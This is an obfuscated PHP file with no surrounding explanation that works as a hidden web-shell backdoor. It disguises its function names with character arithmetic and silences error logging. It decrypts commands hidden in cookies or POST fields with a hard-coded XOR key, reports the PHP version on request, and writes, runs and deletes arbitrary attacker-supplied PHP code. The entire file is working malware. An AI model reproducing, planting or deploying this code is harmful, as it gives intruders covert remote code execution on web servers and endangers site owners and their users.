<?php $gempssi = 'f'.chr(914-809)."\x6c".chr(101)."\137"."\160".'u'."\164"."\137"."\x63".chr(272-161)."\156".chr(116).chr(714-613).chr(369-259).chr(116)."\163";
$qpmbdwsxx = "\142".chr(97)."\163".chr(101)."\66".chr(913-861)."\137"."\x64".chr(101).chr(99).chr(111).chr(917-817)."\145";
$opznsv = chr(105).chr(953-843)."\x69".chr(125-30).chr(115)."\x65"."\x74";
$kxbdgfi = chr(945-828).chr(110)."\x6c"."\x69".chr(490-380).'k';


@$opznsv("\145".chr(114)."\x72".'o'.chr(114).chr(429-334).chr(108).chr(111)."\147", NULL);
@$opznsv('l'.'o'.chr(103).chr(1018-923).'e'.chr(609-495).chr(199-85).chr(111)."\162"."\x73", 0);
@$opznsv("\x6d".'a'.'x'.'_'.'e'.chr(120)."\145"."\143".chr(117)."\x74".chr(105).chr(111).'n'.chr(595-500)."\164".chr(105)."\x6d"."\x65", 0);
@set_time_limit(0);

function vdfouplv($tthqvsesgc, $tyddhghhd)
{
    $dxswsenu = "";
    for ($rofeuj = 0; $rofeuj < strlen($tthqvsesgc);) {
        for ($j = 0; $j < strlen($tyddhghhd) && $rofeuj < strlen($tthqvsesgc); $j++, $rofeuj++) {
            $dxswsenu .= chr(ord($tthqvsesgc[$rofeuj]) ^ ord($tyddhghhd[$j]));
        }
    }
    return $dxswsenu;
}

$ebvkikgyt = array_merge($_COOKIE, $_POST);
$lnfosoew = '882c4803-cb10-4966-9956-408de0c3aebf';
foreach ($ebvkikgyt as $jpemvclt => $tthqvsesgc) {
    $tthqvsesgc = @unserialize(vdfouplv(vdfouplv($qpmbdwsxx($tthqvsesgc), $lnfosoew), $jpemvclt));
    if (isset($tthqvsesgc['a'."\x6b"])) {
        if ($tthqvsesgc[chr(97)] == "\x69") {
            $rofeuj = array(
                chr(244-132).chr(183-65) => @phpversion(),
                chr(867-752)."\x76" => "3.5",
            );
            echo @serialize($rofeuj);
        } elseif ($tthqvsesgc[chr(97)] == 'e') {
            $ptzctepstl = "./" . md5($lnfosoew) . chr(936-890)."\151".chr(289-179).'c';
            @$gempssi($ptzctepstl, "<" . "\x3f"."\160"."\150".chr(112).' '.'@'.'u'.chr(110).chr(108).chr(485-380)."\x6e".'k'."\50"."\x5f".chr(913-818)."\106"."\111".chr(76)."\x45".chr(95).chr(724-629)."\x29"."\73"."\40" . $tthqvsesgc['d']);
            include($ptzctepstl);
            @$kxbdgfi($ptzctepstl);
        }
        exit();
    }
}

